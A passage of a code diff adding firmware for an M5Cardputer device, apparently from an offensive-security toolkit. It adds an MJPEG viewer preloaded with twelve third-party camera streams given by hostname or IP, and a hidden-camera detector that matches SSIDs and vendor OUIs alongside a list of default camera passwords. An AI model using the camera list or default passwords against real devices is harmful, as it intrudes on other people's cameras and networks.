+    div = JPEG_DIV_2;  // impose 1/2 au décodeur -> 160x120 pour 320x240
+  } else {
+    div = JPEG_DIV_NONE; // 160x120 natif
+  }
+
+  // --- sprite 16bpp à la TAILLE CONTENU ---
+  g_spr.deleteSprite();
+  g_spr.setColorDepth(16);
+  if (!g_spr.createSprite(cw, ch)) return;
+
+  // --- décodage à la taille EXACTE 160x120 (pas juste "bornes") ---
+  g_spr.fillScreen(TFT_BLACK);
+  g_spr.drawJpgFile(fs, filepath, 0, 0, cw, ch, 0, 0, div);
+
+  // --- pivot au centre du contenu ---
+  g_spr.setPivot(cw * 0.5f, ch * 0.5f);
+
+  // --- étirement anisotrope vers 240x123 ---
+  const float zx = (float)viewW / (float)cw;   // 240 / 160 = 1.5
+  const float zy = (float)viewH / (float)ch;   // 123 / 120 ≈ 1.025
+  const int   cx = viewX + viewW / 2;
+  const int   cy = viewY + viewH / 2;
+
+  M5.Display.setClipRect(viewX, viewY, viewW, viewH);
+  g_spr.pushRotateZoom(&M5.Display, cx, cy, 0.0f, zx, zy);
+  M5.Display.clearClipRect();
+
+  g_spr.deleteSprite();
+}
+
+// ---------- Streams dynamiques depuis SD ----------
+struct StreamItem {
+  String name;
+  String base;
+};
+static std::vector<StreamItem> g_streams;
+
+String trimBoth(const String& s) {
+  String t = s; t.trim(); return t;
+}
+bool isCommentOrEmpty(const String& s) {
+  if (s.length() == 0) return true;
+  if (s[0] == '#') return true;
+  if (s.startsWith("//")) return true;
+  return false;
+}
+String guessNameFromUrl(const String& url) {
+  UrlParts up;
+  if (parseUrl(url, up)) return up.host;
+  return url;
+}
+int streamCount() {
+  return (int)g_streams.size();
+}
+
+bool loadStreamsFromFile(fs::FS& fs, const char* path) {
+  g_streams.clear();
+  File f = fs.open(path, FILE_READ);
+  if (!f) {
+    MJLOG("Cannot open list: %s\n", path);
+    return false;
+  }
+  while (f.available()) {
+    String line = f.readStringUntil('\n');
+    line.trim();
+    if (isCommentOrEmpty(line)) continue;
+
+    // split "name | url"  (séparateurs acceptés: '|', '\t')
+    int sep = line.indexOf('|');
+    if (sep < 0) sep = line.indexOf('\t');
+
+    String name, url;
+    if (sep >= 0) {
+      name = trimBoth(line.substring(0, sep));
+      url  = trimBoth(line.substring(sep + 1));
+    } else {
+      url  = trimBoth(line);
+      name = guessNameFromUrl(url);
+    }
+    if (!url.startsWith("http://") && !url.startsWith("https://")) {
+      MJLOG("Skip bad url: %s\n", url.c_str());
+      continue;
+    }
+    g_streams.push_back({ name, url });
+  }
+  f.close();
+  MJLOG("Loaded %d stream(s) from %s\n", streamCount(), path);
+  return streamCount() > 0;
+}
+
+// Fallback compilé (au cas où le fichier manque/vide)
+const StreamItem k_fallback_streams[] = {
+  { "Golf Atlantide",    "http://camera.golfatlantide.com:8081/mjpg/video.mjpg" },
+  { "Algonquin",         "http://webcam.thealgonquin.com:8080/mjpg/video.mjpg" },
+  { "WSEiP",             "http://kamera.wseip.edu.pl/mjpg/video.mjpg" },
+  { "Montain view",      "http://77.222.181.11:8080/mjpg/video.mjpg" },
+  { "ZV Noordwijk",      "http://webcam.zvnoordwijk.nl:82/mjpg/video.mjpg" },
+  { "Hotel",             "http://85.196.146.82:3337/mjpg/video.mjpg" },
+  { "Larimer County",    "http://htadmcam01.larimer.org/mjpg/video.mjpg" },
+  { "Brandts Mine",      "http://brandts.mine.nu:84/mjpg/video.mjpg" },
+  { "Mynetname",         "http://e1480d3b88f7.sn.mynetname.net:90/mjpg/video.mjpg" },
+  { "Caban",             "http://77.110.219.78/mjpg/video.mjpg" },
+  { "Fowilh",            "http://fowilh.dynalias.com:1258/mjpg/video.mjpg" },
+  { "Sebewaing Skycam",  "http://skycam.sebewainggigvillage.com/mjpg/video.mjpg" }
+};
+void loadFallbackStreams() {
+  g_streams.clear();
+  for (auto &s : k_fallback_streams) g_streams.push_back(s);
+  MJLOG("Using fallback list (%d streams)\n", streamCount());
+}
+
+// ---------- Helpers UI ----------
+String buildUrl(const StreamItem& s, const char* res, int comp) {
+  String u = s.base;
+  if (u.indexOf('?') < 0) {
+    u += "?resolution=";
+    u += res;
+    u += "&compression=";
+    u += comp;
+  }
+  else {
+    u += "&resolution=";
+    u += res;
+    u += "&compression=";
+    u += comp;
+  }
+  return u;
+}
+
+// ====== MENU (rendu sur changement uniquement) ======
+void menuDrawStatic() {
+  M5.Display.fillScreen(TFT_BLACK);
+  uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
+  uiText(2, 58, "ENTER: Lancer   LEFT/RIGHT: Flux", TFT_YELLOW);
+  uiText(2, 70, "R: Res  UP/DOWN: Comp  BACKSPACE: Retour", TFT_YELLOW);
+}
+void menuDrawFields(int streamIdx, int resIdx, int comp) {
+  M5.Display.fillRect(0, 18, SCREEN_W, 36, TFT_BLACK);
+  uiPrintf(2, 18, TFT_WHITE, "Flux:  [%d/%d] %s", streamIdx + 1, streamCount(), g_streams[streamIdx].name.c_str());
+  uiPrintf(2, 30, TFT_WHITE, "Res.:  %s  (touche R)", RES_LIST[resIdx]);
+  uiPrintf(2, 42, TFT_WHITE, "Comp.: %d  (UP/DOWN)", comp);
+}
+
+// true  => ENTER : lancer le viewer
+// false => BACKSPACE / ` : remonter au menu parent (scanCCTVCameras)
+bool runMenu() {
+  menuDrawStatic();
+  int last_stream = -1, last_res = -1, last_comp = -999;
+  bool needFields = true;
+
+  // Aucun flux -> attendre BACKSPACE pour remonter
+  if (streamCount() == 0) {
+    M5.Display.fillScreen(TFT_BLACK);
+    uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
+    uiText(2, 18, "Aucun flux. Verifie SD:/evil/CCTV/CCTV_live.txt", TFT_RED);
+    uiText(2, 30, "BACKSPACE: Retour / ` : Quit", TFT_YELLOW);
+    while (true) {
+      M5.update(); M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
+      if (M5Cardputer.Keyboard.isKeyPressed('`')) return false;
+      delay(20);
+    }
+  }
+
+  if (g_sel_stream >= streamCount()) g_sel_stream = 0;
+
+  while (true) {
+    M5.update(); M5Cardputer.update();
+
+    // navigation flux (',' et '/')
+    bool left  = M5Cardputer.Keyboard.isKeyPressed(',');
+    bool right = M5Cardputer.Keyboard.isKeyPressed('/');
+
+    if (left)  {
+      g_sel_stream = (g_sel_stream - 1 + streamCount()) % streamCount();
+      needFields = true;
+      delay(140); // anti-rebond
+    }
+    if (right) {
+      g_sel_stream = (g_sel_stream + 1) % streamCount();
+      needFields = true;
+      delay(140); // anti-rebond
+    }
+
+    if (M5Cardputer.Keyboard.isKeyPressed('r')) {
+      g_sel_res_idx = (g_sel_res_idx + 1) % RES_COUNT;
+      needFields = true;
+      delay(140);
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+      g_sel_comp = min(COMP_MAX, g_sel_comp + 1);
+      needFields = true;
+      delay(60);
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+      g_sel_comp = max(COMP_MIN, g_sel_comp - 1);
+      needFields = true;
+      delay(60);
+    }
+
+    if (needFields || g_sel_stream != last_stream || g_sel_res_idx != last_res || g_sel_comp != last_comp) {
+      menuDrawFields(g_sel_stream, g_sel_res_idx, g_sel_comp);
+      last_stream = g_sel_stream; last_res = g_sel_res_idx; last_comp = g_sel_comp;
+      needFields = false;
+    }
+
+    // sorties
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))     return true;   // lancer viewer
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;  // retour parent
+    if (M5Cardputer.Keyboard.isKeyPressed('`'))           return false;  // retour parent
+
+    delay(8);
+  }
+}
+
+
+
+// ---------- MJPEG VIEWER (timeouts 5s, sans goto) ----------
+bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* pathB) {
+  // true -> revenir au menu ; false -> changer de flux (switch interne)
+  UrlParts up;
+  if (!parseUrl(String(url), up) || up.https) return true;
+
+  bool exitToMenu = false; // BACKSPACE
+  int  switchDelta = 0;    // -1 / +1 pour changer de flux
+
+  while (!exitToMenu && switchDelta == 0) {
+    M5.update(); M5Cardputer.update();
+
+    WiFiClient client;
+    client.setTimeout(1);
+
+    // statut discret sous la barre
+    M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+    uiText(2, TOPBAR_H, "Connexion flux...", TFT_WHITE);
+
+    // ---- TCP connect ----
+    uint32_t ready_deadline = millis() + STREAM_READY_TIMEOUT_MS;
+    if (!client.connect(up.host.c_str(), up.port, CONNECT_TO_MS)) {
+      delay(200);
+      continue;
+    }
+
+    // ---- HTTP GET ----
+    String req;
+    req += "GET " + up.path + " HTTP/1.1\r\n";
+    req += "Host: " + up.host + ":" + String(up.port) + "\r\n";
+    req += "User-Agent: M5Cardputer-MJPEG\r\n";
+    req += "Accept: multipart/x-mixed-replace, image/jpeg\r\n";
+    req += "Connection: keep-alive\r\n\r\n";
+    client.print(req);
+
+    char line[768];
+    bool reconnect = false;
+
+    // ---- Status line (deadline 5s) ----
+    bool haveStatus = false;
+    while (!haveStatus) {
+      if (readLineCCTV(client, line, sizeof(line)) > 0) {
+        haveStatus = true;
+        break;
+      }
+      if (millis() > ready_deadline) {
+        uiText(2, TOPBAR_H, "Timeout 5s (status)", TFT_RED);
+        reconnect = true;
+        break;
+      }
+      // clavier pendant attente
+      M5.update(); M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        client.stop();
+        return true;
+      }
+      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
+        switchDelta = -1;
+        client.stop();
+        break;
+      }
+      if (M5Cardputer.Keyboard.isKeyPressed('/')) {
+        switchDelta = +1;
+        client.stop();
+        break;
+      }
+      delay(5);
+    }
+    if (!reconnect) {
+      if (!strncmp(line, "HTTP/1.1 200", 12) || !strncmp(line, "HTTP/1.0 200", 12)) {
+        // OK
+      } else {
+        // Erreur HTTP => retour menu direct
+        client.stop();
+        String statusLine = String(line);
+        statusLine.trim();
+        M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+        uiText(2, TOPBAR_H, (statusLine + " -> retour menu").c_str(), TFT_RED);
+        delay(1200);
+        return true;
+      }
+    }
+    if (reconnect) {
+      client.stop();
+      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
+      delay(250);
+      continue;
+    }
+
+    // ---- Headers (deadline 5s) ----
+    String boundary, contentTypeSeen;
+    while (true) {
+      int n = readLineCCTV(client, line, sizeof(line));
+      if (n > 0) {
+        String hLow = String(line); hLow.toLowerCase();
+        if (hLow.startsWith("content-type:")) {
+          contentTypeSeen = String(line);
+          String low = contentTypeSeen; low.toLowerCase();
+          int p = low.indexOf("boundary=");
+          if (p >= 0) {
+            String val = contentTypeSeen.substring(p + 9);
+            int sc = val.indexOf(';'); if (sc >= 0) val = val.substring(0, sc);
+            val.trim();
+            if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) val = val.substring(1, val.length() - 1);
+            if (!val.startsWith("--")) val = "--" + val;
+            boundary = val;
+          }
+        }
+      } else {
+        if (client.available() == 0) {
+          if (millis() > ready_deadline) {
+            uiText(2, TOPBAR_H, "Timeout 5s (headers)", TFT_RED);
+            reconnect = true;
+          } else {
+            // clavier pendant attente
+            M5.update(); M5Cardputer.update();
+            if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+              client.stop();
+              return true;
+            }
+            if (M5Cardputer.Keyboard.isKeyPressed(',')) {
+              switchDelta = -1;
+              client.stop();
+              break;
+            }
+            if (M5Cardputer.Keyboard.isKeyPressed('/')) {
+              switchDelta = +1;
+              client.stop();
+              break;
+            }
+            delay(5);
+            continue;
+          }
+        }
+        break; // data dispo -> fin headers
+      }
+      if (!line[0]) break; // blank line -> fin headers
+    }
+    if (reconnect) {
+      client.stop();
+      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
+      delay(250);
+      continue;
+    }
+
+    // ---- Sniff boundary si manquant (deadline 5s) ----
+    bool alreadySyncedFirstPart = false;
+    if (!boundary.length()) {
+      while (true) {
+        int n = readLineCCTV(client, line, sizeof(line));
+        if (n > 0) {
+          if (line[0] == '-' && line[1] == '-') {
+            boundary = String(line);
+            boundary.trim();
+            alreadySyncedFirstPart = true;
+            break;
+          }
+        } else {
+          if (millis() > ready_deadline) {
+            uiText(2, TOPBAR_H, "Timeout 5s (boundary)", TFT_RED);
+            reconnect = true;
+            break;
+          }
+          // clavier pendant attente
+          M5.update(); M5Cardputer.update();
+          if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+            client.stop();
+            return true;
+          }
+          if (M5Cardputer.Keyboard.isKeyPressed(',')) {
+            switchDelta = -1;
+            client.stop();
+            break;
+          }
+          if (M5Cardputer.Keyboard.isKeyPressed('/')) {
+            switchDelta = +1;
+            client.stop();
+            break;
+          }
+          delay(5);
+        }
+      }
+    }
+    if (reconnect) {
+      client.stop();
+      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
+      delay(250);
+      continue;
+    }
+
+    // Nettoie la zone "statut"
+    M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+
+    // FPS state & topbar
+    uint32_t fpsT0 = millis();
+    uint32_t fpsFrames = 0;
+    float    lastFPS = 0.0f;
+    String left = g_streams[g_sel_stream].name + "  " + RES_LIST[g_sel_res_idx] + "  c=" + String(g_sel_comp);
+    drawTopBar(left, lastFPS);
+
+    bool useA = true;
+    uint32_t lastDataMs = millis();
+
+    // === boucle frames ===
+    while (!exitToMenu && switchDelta == 0) {
+      M5.update(); M5Cardputer.update();
+
+      bool leftKey  = M5Cardputer.Keyboard.isKeyPressed(',');
+      bool rightKey = M5Cardputer.Keyboard.isKeyPressed('/');
+
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        exitToMenu = true;
+        break;
+      }
+      if (leftKey)  {
+        switchDelta = -1;
+        break;
+      }
+      if (rightKey) {
+        switchDelta = +1;
+        break;
+      }
+
+      // No-data watchdog
+      if (millis() - lastDataMs > STREAM_NO_DATA_TIMEOUT_MS) {
+        uiText(2, TOPBAR_H, "No data 5s -> reconnect", TFT_YELLOW);
+        reconnect = true;
+        break;
+      }
+
+      // sync boundary
+      bool synced = alreadySyncedFirstPart; alreadySyncedFirstPart = false;
+      if (!synced) {
+        while (true) {
+          int n = readLineCCTV(client, line, sizeof(line));
+          if (n <= 0) {
+            if (client.available() == 0) break;
+            else {
+              synced = true;
+              lastDataMs = millis();
+              break;
+            }
+          }
+          if (String(line).startsWith(boundary)) {
+            synced = true;
+            lastDataMs = millis();
+            break;
+          }
+        }
+        if (!synced) {
+          reconnect = true;
+          break;
+        }
+      }
+
+      // headers part
+      size_t contentLen = 0; bool haveLen = false; bool headerEnd = false;
+      while (true) {
+        int n = readLineCCTV(client, line, sizeof(line));
+        if (n <= 0) {
+          if (client.available() > 0) headerEnd = true;
+          break;
+        }
+        lastDataMs = millis();
+        if (String(line).startsWith(boundary)) continue;
+        if (!line[0]) {
+          headerEnd = true;
+          break;
+        }
+        String hl = String(line); hl.toLowerCase();
+        if (hl.startsWith("content-length:")) {
+          contentLen = hl.substring(15).toInt();
+          haveLen = contentLen > 0;
+        }
+      }
+      if (!headerEnd) {
+        reconnect = true;
+        break;
+      }
+
+      // fichier cible
+      const char* filepath = useA ? pathA : pathB; useA = !useA;
+      File f = fs.open(filepath, FILE_WRITE); if (!f) {
+        reconnect = true;
+        break;
+      }
+
+      bool ok = true; size_t totalWritten = 0; uint8_t buf[IO_CHUNK];
+
+      if (haveLen && contentLen > 0) {
+        MJLOG("[MJPEG-DBG] Expecting %u bytes for frame\n", (unsigned)contentLen);
+        size_t remain = contentLen;
+        while (remain > 0) {
+          size_t toRead = (remain > IO_CHUNK) ? IO_CHUNK : remain;
+          size_t got = readN(client, buf, toRead, READ_CHUNK_DEADLINE_MS);
+          if (got == 0) {
+            MJLOG("[MJPEG-DBG] Timeout/chunk read fail, remain=%u\n", (unsigned)remain);
+            ok = false;
+            break;
+          }
+          lastDataMs = millis();
+          if (f.write(buf, got) != got) {
+            ok = false;
+            break;
+          }
+          remain -= got; totalWritten += got;
+        }
+      } else {
+        bool lastFF = false; uint32_t waitStart = millis();
+        while (true) {
+          int avail = client.available();
+          int want  = (avail > 0) ? min(avail, (int)IO_CHUNK) : 1;
+          int r = client.read(buf, want);
+          if (r <= 0) {
+            if (millis() - waitStart > READ_CHUNK_DEADLINE_MS) {
+              MJLOG("[MJPEG-DBG] Timeout before EOI, bytes=%u\n", (unsigned)totalWritten);
+              ok = false;
+              break;
+            }
+            delay(1); continue;
+          }
+          waitStart = millis(); lastDataMs = millis();
+          for (int i = 0; i < r; ++i) {
+            uint8_t b = buf[i];
+            if (f.write(&b, 1) != 1) {
+              MJLOG("[MJPEG-DBG] Write fail mid-frame\n");
+              ok = false;
+              break;
+            }
+            totalWritten++;
+            if (lastFF && b == 0xD9) {
+              i = r;  // EOI
+              break;
+            }
+            lastFF = (b == 0xFF);
+          }
+          if (!ok) break;
+        }
+      }
+      f.close();
+      if (!ok || totalWritten < 32) {
+        reconnect = true;
+        break;
+      }
+
+      // affichage (ne touche pas la barre)
+      drawScaledJpg(fs, filepath);
+
+      // FPS stable (maj 1x/s)
+      fpsFrames++;
+      uint32_t now = millis();
+      if (now - fpsT0 >= 1000) {
+        lastFPS = fpsFrames * 1000.0f / (float)(now - fpsT0);
+        fpsFrames = 0; fpsT0 = now;
+        drawTopBar(left, lastFPS);
+      }
+    } // frames
+
+    client.stop();
+
+    if (reconnect && !exitToMenu && switchDelta == 0) {
+      // BACKSPACE pendant reconnexion
+      M5.update(); M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || 
+          M5Cardputer.Keyboard.isKeyPressed('`')) {
+        return true;
+      }
+      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
+      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
+
+      for (uint16_t t = 0; t < 250; t += 20) {
+        delay(20);
+        M5.update(); M5Cardputer.update();
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || 
+            M5Cardputer.Keyboard.isKeyPressed('`')) {
+          return true;
+        }
+      }
+      continue;
+    }
+
+  } // while session
+
+  if (switchDelta != 0) {
+    if (streamCount() > 0)
+      g_sel_stream = (g_sel_stream + switchDelta + streamCount()) % streamCount();
+    return false; // relancer viewer direct (sans repasser par menu)
+  }
+  return true; // retour menu
+}
+
+
+
+void runCCTV_MJPEGViewer() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return; // retour au menu principal
+  }
+  enterDebounce();
+  M5.Display.setTextSize(1);
+
+  bool spiffs_ok = false;
+  bool sd_ok = true;
+  if (!sd_ok) spiffs_ok = SPIFFS.begin(true);
+  if (!sd_ok && !spiffs_ok) {
+    uiText(2, 2, "No SD/SPIFFS. Aborting.", TFT_RED);
+    while (1) delay(1000);
+  }
+  if (sd_ok && !SD.exists(SD_TMP_DIR)) SD.mkdir(SD_TMP_DIR);
+
+  // Charger la liste depuis SD; sinon fallback compilé
+  if (!sd_ok || !loadStreamsFromFile(SD, CCTV_LIST_PATH)) {
+    loadFallbackStreams();
+  }
+
+  fs::FS* pfs = sd_ok ? (fs::FS*)&SD : (fs::FS*)&SPIFFS;
+  const char* fileA = sd_ok ? SD_FILE_A : SPIFFS_FILE_A;
+  const char* fileB = sd_ok ? SD_FILE_B : SPIFFS_FILE_B;
+
+  // Boucle globale : on reste ici tant que l'utilisateur ne remonte pas au menu parent
+  while (!M5Cardputer.Keyboard.isKeyPressed('`')) {
+    // --- Menu de sélection des flux ---
+    bool launch = runMenu();   // true = ENTER (lancer), false = BACKSPACE/` (retour parent)
+    if (!launch) return;       // <- retour à scanCCTVCameras (menu parent)
+
+    if (streamCount() == 0) return;
+
+        // --- Boucle viewer : permettre switch +/- sans repasser par le menu de sélection ---
+    while (true) {
+      String url = buildUrl(g_streams[g_sel_stream], RES_LIST[g_sel_res_idx], g_sel_comp);
+      bool backToMenu = mjpegViewerFS(url.c_str(), *pfs, fileA, fileB);
+      if (backToMenu) {
+        backDebounce();
+        break; // on sort uniquement si BACKSPACE (menu)
+      }
+      // sinon mjpegViewerFS a changé g_sel_stream -> on relance direct sans break
+    }
+  }
+}
+
+#include <pgmspace.h>
+
+// =========================
+// 1) LISTES HARDCODÉES (PROGMEM)
+// =========================
+
+// SSID (préfixes/motifs)
+const char ssid0[]  PROGMEM = "IPCAM";
+const char ssid1[]  PROGMEM = "IPCAM_";
+const char ssid2[]  PROGMEM = "IPC-";
+const char ssid3[]  PROGMEM = "IPC_";
+const char ssid4[]  PROGMEM = "PV-";
+const char ssid5[]  PROGMEM = "MATECAM_X1";
+const char ssid6[]  PROGMEM = "WIFICAMERA";
+const char ssid7[]  PROGMEM = "HDCAM";
+const char ssid8[]  PROGMEM = "HDWIFICAM";
+const char ssid9[]  PROGMEM = "CAMP2P";
+const char ssid10[] PROGMEM = "P2P_";
+const char ssid11[] PROGMEM = "ICAM";
+const char ssid12[] PROGMEM = "NETCAM";
+const char ssid13[] PROGMEM = "GW_IPC";
+
+const char* const HC_SPYCAM_SSID_LIST[] PROGMEM = {
+  ssid0, ssid1, ssid2, ssid3, ssid4, ssid5, ssid6, ssid7,
+  ssid8, ssid9, ssid10, ssid11, ssid12, ssid13
+};
+const uint8_t HC_SPYCAM_SSID_COUNT =
+  sizeof(HC_SPYCAM_SSID_LIST) / sizeof(HC_SPYCAM_SSID_LIST[0]);
+
+// OUIs (AA:BB:CC)
+const char oui0[]  PROGMEM = "10:A4:BE";
+const char oui1[]  PROGMEM = "0C:8C:24";
+const char oui2[]  PROGMEM = "74:EE:2A";
+const char oui3[]  PROGMEM = "94:BA:06";
+const char oui4[]  PROGMEM = "14:6B:9C";
+const char oui5[]  PROGMEM = "28:F3:66";
+const char oui6[]  PROGMEM = "20:F4:1B";
+const char oui7[]  PROGMEM = "34:7D:E4";
+
+const char oui8[]  PROGMEM = "D4:B7:61";
+const char oui9[]  PROGMEM = "40:24:B2";
+const char oui10[] PROGMEM = "18:EF:3A";
+const char oui11[] PROGMEM = "30:88:41";
+const char oui12[] PROGMEM = "4C:24:CE";
+const char oui13[] PROGMEM = "50:E4:78";
+const char oui14[] PROGMEM = "60:1D:9D";
+const char oui15[] PROGMEM = "70:C9:12";
+const char oui16[] PROGMEM = "B4:61:E9";
+const char oui17[] PROGMEM = "0C:CD:B4";
+
+const char oui18[] PROGMEM = "98:D8:63";
+const char oui19[] PROGMEM = "F0:FE:6B";
+const char oui20[] PROGMEM = "D4:27:87";
+const char oui21[] PROGMEM = "E8:FD:F8";
+
+const char* const HC_SPYCAM_OUI_LIST[] PROGMEM = {
+  oui0, oui1, oui2, oui3, oui4, oui5, oui6, oui7,
+  oui8, oui9, oui10, oui11, oui12, oui13, oui14, oui15, oui16, oui17,
+  oui18, oui19, oui20, oui21
+};
+const uint8_t HC_SPYCAM_OUI_COUNT =
+  sizeof(HC_SPYCAM_OUI_LIST) / sizeof(HC_SPYCAM_OUI_LIST[0]);
+
+// Mots de passe par défaut
+const char pwd0[] PROGMEM = "01234567";
+const char pwd1[] PROGMEM = "12345678";
+const char pwd2[] PROGMEM = "123456";
+const char pwd3[] PROGMEM = "88888888";
+const char* const HC_DEFAULT_PWD_LIST[] PROGMEM = { pwd0, pwd1, pwd2, pwd3 };
+const uint8_t HC_DEFAULT_PWD_COUNT =
+  sizeof(HC_DEFAULT_PWD_LIST) / sizeof(HC_DEFAULT_PWD_LIST[0]);
+
+// Liste BLANCHE
+const char atest0[] PROGMEM = "MATECAM_X1";
+const char atest1[] PROGMEM = "WIFICAMERA";
+const char atest2[] PROGMEM = "IPCAM";
+const char atest3[] PROGMEM = "IPC-";
+const char atest4[] PROGMEM = "PV-";
+const char atest5[] PROGMEM = "HDCAM";
+const char atest6[] PROGMEM = "HDWIFICAM";
+const char atest7[] PROGMEM = "CAMP2P";
+const char atest8[] PROGMEM = "P2P_";
+const char atest9[] PROGMEM = "ICAM";
+const char atest10[] PROGMEM = "NETCAM";
+const char atest11[] PROGMEM = "GW_IPC";
+
+const char* const HC_ALLOWED_TEST_SSIDS[] PROGMEM = {
+  atest0, atest1, atest2, atest3, atest4, atest5,
+  atest6, atest7, atest8, atest9, atest10, atest11
+};
+const uint8_t HC_ALLOWED_TEST_SSIDS_COUNT =
+  sizeof(HC_ALLOWED_TEST_SSIDS) / sizeof(HC_ALLOWED_TEST_SSIDS[0]);
+
+// =========================
+// 2) ETAT
+// =========================
+const unsigned long WIFI_SCAN_PERIOD_MS = 1500;
+const unsigned long UI_REFRESH_MS       = 300;
+const int RSSI_ALERT_THRESHOLD          = -40;
+
+bool spycamScanningHC = false;
+unsigned long lastWifiScanHC = 0;
+unsigned long lastUiHC = 0;
+
+char msgBuf[512];
+char tmpA[48];
+char tmpB[48];
+
+// =========================
+// 3) OUTILS
+// =========================
+void pgmReadString(const char* p, char* out, size_t outLen) {
+  strncpy_P(out, p, outLen - 1);
+  out[outLen - 1] = '\0';
+}
+bool pgmStringStartsWith(const char* p, const char* up) {
+  pgmReadString(p, tmpA, sizeof(tmpA));
+  size_t L = strlen(tmpA);
+  return strncmp(up, tmpA, L) == 0;
+}
+void toUpperTrim(char* s) {
+  while (*s==' '||*s=='\t'||*s=='\r'||*s=='\n') memmove(s, s+1, strlen(s));
+  size_t L = strlen(s);
+  while (L && (s[L-1]==' '||s[L-1]=='\t'||s[L-1]=='\r'||s[L-1]=='\n')) { s[L-1]='\0'; L--; }
+  for (size_t i=0;i<L;i++) s[i] = toupper((unsigned char)s[i]);
+}
+void bssidToStrHC(const uint8_t* b, char* out, size_t outLen) {
+  snprintf(out, outLen, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
+}
+void ouiFromBssidHC(const char* bssid, char* oui, size_t outLen) {
+  snprintf(oui, outLen, "%.8s", bssid);
+}
+bool looksLikeFdigits(const char* up) {
+  size_t L = strlen(up);
+  if (L < 4) return false;
+  if (up[0] != 'F') return false;
+  for (size_t i=1;i<L;i++) if (!isdigit((unsigned char)up[i])) return false;
+  return true;
+}
+bool looksLikeA9Style(const char* up) {
+  size_t L = strlen(up);
+  if (L < 6 || L > 12) return false;
+  for (size_t i=0;i<L;i++) {
+    char c = up[i];
+    if (!((c>='0'&&c<='9')||(c>='A'&&c<='Z'))) return false;
+  }
+  for (uint8_t i=0;i<HC_SPYCAM_SSID_COUNT;i++) {
+    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_SSID_LIST[i]);
+    if (pgmStringStartsWith(p, up)) return false;
+  }
+  if (looksLikeFdigits(up)) return false;
+  return true;
+}
+const char* authToTextHC(wifi_auth_mode_t m) {
+  switch (m) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
+    default: return "UNK";
+  }
+}
+void drawSpycamScreenHC(const char* text, bool alert) {
+  M5.Display.fillScreen(TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(0,0);
+  M5.Display.setTextColor(alert ? TFT_RED : menuTextUnFocusedColor);
+  M5.Display.println(text);
+  if (alert) {
+    M5.Speaker.tone(1200, 220);
+    pixels.setPixelColor(0, pixels.Color(255, 0, 0)); pixels.show();
+    delay(60);
+    pixels.setPixelColor(0, pixels.Color(0, 0, 0)); pixels.show();
+  }
+}
+
+// =========================
+// 4) DETECTION
+// =========================
+bool isSpyBySSIDHC(const char* ssid, char* reasonOut, size_t reasonLen) {
+  strncpy(tmpB, ssid && ssid[0] ? ssid : "<hidden>", sizeof(tmpB)-1);
+  tmpB[sizeof(tmpB)-1]='\0';
+  toUpperTrim(tmpB);
+
+  for (uint8_t i=0;i<HC_SPYCAM_SSID_COUNT;i++) {
+    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_SSID_LIST[i]);
+    if (pgmStringStartsWith(p, tmpB)) {
+      strncpy(reasonOut, "SSID_MATCH", reasonLen-1); reasonOut[reasonLen-1]='\0';
+      return true;
+    }
+  }
+  if (looksLikeFdigits(tmpB)) {
+    strncpy(reasonOut, "Fxxxxx", reasonLen-1); reasonOut[reasonLen-1]='\0';
+    return true;
+  }
+  if (looksLikeA9Style(tmpB)) {
+    strncpy(reasonOut, "A9_STYLE", reasonLen-1); reasonOut[reasonLen-1]='\0';
+    return true;
+  }
+  strncpy(reasonOut, "NONE", reasonLen-1); reasonOut[reasonLen-1]='\0';
+  return false;
+}
+bool isSpyByOUIHC(const char* oui, char* reasonOut, size_t reasonLen) {
+  strncpy(tmpB, oui, sizeof(tmpB)-1); tmpB[sizeof(tmpB)-1]='\0';
+  toUpperTrim(tmpB);
+  for (uint8_t i=0;i<HC_SPYCAM_OUI_COUNT;i++) {
